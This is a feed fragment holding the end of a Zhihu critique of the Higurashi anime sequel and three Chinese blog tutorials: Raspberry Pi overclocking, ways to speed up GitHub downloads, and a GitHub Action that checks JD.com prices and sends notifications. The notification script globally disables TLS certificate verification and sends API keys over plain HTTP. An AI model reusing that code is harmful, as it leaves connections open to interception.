data-original-src=\"v2-ae02b41d08370377b0ba97917acf57ae\" data-watermark-src=\"v2-552356d822ef31261ae39c97882ecd3c\" data-private-watermark-src=\"v2-e6a23075a34fcc695c367bf130a43f30\"></p>\n<p><br></p>\n<p>• 制作组好像真的很喜欢沙都子，从业到现在涉及到沙都子的画面基本上都没啥大的崩坏，甚至可以说是精致：</p>\n<p><img src=\"https://pic3.zhimg.com/v2-a8adb805335efbef4f3a6b5fe5363a8c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"watermark\" data-original-src=\"v2-a8adb805335efbef4f3a6b5fe5363a8c\" data-watermark-src=\"v2-2e6308f51c0cde1a61b3a22e3cf97ec0\" data-private-watermark-src=\"v2-ab36b4129a757259676ca678db3f8f79\"></p>\n<p><br></p>\n<p>• 鬼明篇最后一集暴露出了《卒》的一个重大问题，那就是对于「解答方式」的不当处理。在猫骗篇和乡坏篇的铺垫之上，《业》前三篇的许多谜题其实已经不需要像鬼明篇这样按部就班地进行解读了，有寒蝉原作基础的观众靠自己的推理可以厘清大部分的谜题。或者说，这种仿佛游戏第二周目一样调换视角、补充隐藏要素的解答方式，必然会出现大量的复述性和回顾性内容，而这对观众的观看体验来说，很难起到正面作用，甚至会令人觉得这是在有意凑篇幅和水剧情。实际上谜题复杂程度更高的寒蝉本篇，当初在写解答篇的时候也是用了完全不同的故事来间接解答前篇的谜题，可见鬼明篇这样的解答篇是不合格的，也可以说是脚本家偷懒的结果。</p>\n<p>• 如果之后的两个解答篇都和鬼明篇思路一致的话，那么留给《卒》的最后一个篇章的压力是非常巨大的，毕竟前三篇都只是用来撑长度和复盘剧情的，那么终章需要有足够多的爆点和足够强大的反转才能令读者满意，但龙七一向不善于填坑，那么关于《卒》整体风评的预期，大概不会很乐观...</p>\n<p>• 不论如何，还是很期待《绵明篇》，希望在《业》中没什么戏份的诗音可以有高光表现。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-625d165409c73368f1ca55ad4a1f48bf_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"840\" data-rawheight=\"392\" data-watermark=\"watermark\" data-original-src=\"v2-625d165409c73368f1ca55ad4a1f48bf\" data-watermark-src=\"v2-5d6e9e7bdefe13c5bcedb815672d9f0a\" data-private-watermark-src=\"v2-ba7e016c31ff18ad5b56fda7d3de0a87\" data-tags=\"politic\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/gris-griffith?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">岸边的塞涅卡</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/469405052/answer/1974393667?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">9 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/322053588?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">看完并喜欢动画《寒蝉鸣泣之时》系列，可能会是怎样的人？</a><br><a href=\"http://www.zhihu.com/question/423143915?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价2020年10月开播的动画《寒蝉鸣泣之时》？</a><br>\n","link":"http://www.zhihu.com/question/469405052/answer/1974393667?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"树莓派超频","date":"2021-06-25 07:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"加速 GitHub 下载","date":"2021-06-18 09:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 10:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 